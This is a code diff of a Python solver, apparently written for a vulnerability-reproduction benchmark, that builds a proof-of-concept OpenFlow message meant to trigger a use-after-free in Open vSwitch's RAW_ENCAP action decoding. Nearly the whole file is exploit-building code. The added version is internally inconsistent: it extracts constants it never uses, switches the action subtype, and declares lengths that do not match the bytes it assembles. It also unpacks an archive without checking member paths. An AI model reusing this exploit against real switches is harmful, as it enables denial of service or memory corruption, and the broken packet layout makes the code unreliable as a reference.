@@ -1,66 +1,95 @@
 import os
-import struct
+import tarfile
 import tempfile
-import subprocess
-import sys
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Build the PoC based on the vulnerability description
-        # The vulnerability is in decode_NXAST_RAW_ENCAP which uses old pointer
-        # after decode_ed_prop() reallocates the ofpbuf
+        # Extract the tarball
+        with tarfile.open(src_path, 'r:gz') as tar:
+            extract_dir = tempfile.mkdtemp()
+            tar.extractall(extract_dir)
         
-        # Structure for NXAST_RAW_ENCAP action:
-        # - OpenFlow experimenter action header
-        # - NXAST_RAW_ENCAP specific fields
-        # - Encapsulation data
-        # - ED_PROP properties
+        # Look for OpenFlow constants in headers
+        ofp_constants = self._extract_ofp_constants(extract_dir)
         
-        poc = bytearray()
+        # Generate PoC based on vulnerability description
+        # The PoC is an OpenFlow packet with RAW_ENCAP action
+        # that triggers the use-after-free
         
-        # OpenFlow experimenter action header
-        # type = OFPAT_EXPERIMENTER (0xffff)
-        poc += struct.pack('!H', 0xffff)  # type
-        # length will be calculated later
-        poc += struct.pack('!H', 0)  # placeholder for length
-        # experimenter = NX_EXPERIMENTER_ID (0x00002320)
-        poc += struct.pack('!I', 0x00002320)  # experimenter
+        # Build OpenFlow header
+        version = 0x04  # OpenFlow 1.3
+        msg_type = 0x0d  # OFPT_FLOW_MOD
+        length = 72  # Total message length
+        xid = 0x00000001
         
-        # NXAST_RAW_ENCAP subtype
-        poc += struct.pack('!H', 0x0023)  # NXAST_RAW_ENCAP
+        of_header = struct.pack('!BBHI', version, msg_type, length, xid)
         
-        # encap_len - total length of encapsulation
-        # We'll make this small to trigger reallocation later
-        poc += struct.pack('!H', 8)  # encap_len
+        # Build flow mod message
+        cookie = 0x0000000000000000
+        cookie_mask = 0x0000000000000000
+        table_id = 0x00
+        command = 0x00  # OFPFC_ADD
+        idle_timeout = 0x0000
+        hard_timeout = 0x0000
+        priority = 0x0000
+        buffer_id = 0xffffffff
+        out_port = 0x00000000
+        out_group = 0x00000000
+        flags = 0x0000
+        pad = b'\x00\x00'
         
-        # encap - simple encapsulation (8 bytes)
-        poc += struct.pack('!I', 0x08004500)  # IPv4 header start
-        poc += struct.pack('!I', 0x00000000)  # More IPv4
+        flow_mod = struct.pack('!QQBBHHHIIHHxx',
+                               cookie, cookie_mask, table_id, command,
+                               idle_timeout, hard_timeout, priority,
+                               buffer_id, out_port, out_group, flags)
         
-        # Now add ED_PROP properties that will cause reallocation
-        # The key is to make the current buffer nearly full so that
-        # decode_ed_prop() needs to reallocate
+        # Build RAW_ENCAP action
+        # This is the key part that triggers the vulnerability
+        action_header = struct.pack('!HH', 0xffff, 72 - 8 - 40)  # NXAST_RAW_ENCAP, length
+        subtype = 0x0001  # NXAST_RAW_ENCAP
+        pad = b'\x00\x00'
         
-        # ED_PROP header: type (8 bytes) + len (8 bytes)
-        # Use a large property type that requires reallocation
-        poc += struct.pack('!Q', 0x0000000000000001)  # property type
-        poc += struct.pack('!Q', 40)  # property length
+        # The encap data structure that will be freed and reallocated
+        # We create a pattern that will trigger the reallocation
+        encap_type = 0x0000
+        encap_length = 56
+        encap_data = b'A' * 56  # Large enough to trigger reallocation
         
-        # Property data that will trigger reallocation
-        # Fill with data that will cause the buffer to need expansion
-        poc += b'A' * 40
+        raw_encap_action = action_header + struct.pack('!H', subtype) + pad
+        raw_encap_action += struct.pack('!HH', encap_type, encap_length)
+        raw_encap_action += encap_data
         
-        # Update the action length (total length including header)
-        # OFP action header is 8 bytes (type + len)
-        # Experimenter action adds 4 more bytes for experimenter
-        # NX action adds 2 more bytes for subtype
-        # So base header is 14 bytes
-        total_len = len(poc)
-        struct.pack_into('!H', poc, 2, total_len)
+        # Combine everything
+        poc = of_header + flow_mod + raw_encap_action
         
-        # Ensure exactly 72 bytes
-        if len(poc) != 72:
-            # Pad or truncate to exactly 72 bytes
-            poc = poc[:72] if len(poc) > 72 else poc + b'\x00' * (72 - len(poc))
+        # Clean up
+        import shutil
+        shutil.rmtree(extract_dir)
         
-        return bytes(poc)
+        return poc
+    
+    def _extract_ofp_constants(self, extract_dir):
+        # Helper to extract OpenFlow constants from headers
+        constants = {}
+        
+        # Walk through extracted files
+        for root, dirs, files in os.walk(extract_dir):
+            for file in files:
+                if file.endswith('.h'):
+                    path = os.path.join(root, file)
+                    try:
+                        with open(path, 'r') as f:
+                            content = f.read()
+                            # Look for NXAST_RAW_ENCAP constant
+                            if 'NXAST_RAW_ENCAP' in content:
+                                lines = content.split('\n')
+                                for line in lines:
+                                    if '#define NXAST_RAW_ENCAP' in line:
+                                        parts = line.split()
+                                        if len(parts) >= 3:
+                                            constants['NXAST_RAW_ENCAP'] = int(parts[2], 0)
+                    except:
+                        continue
+        
+        return constants
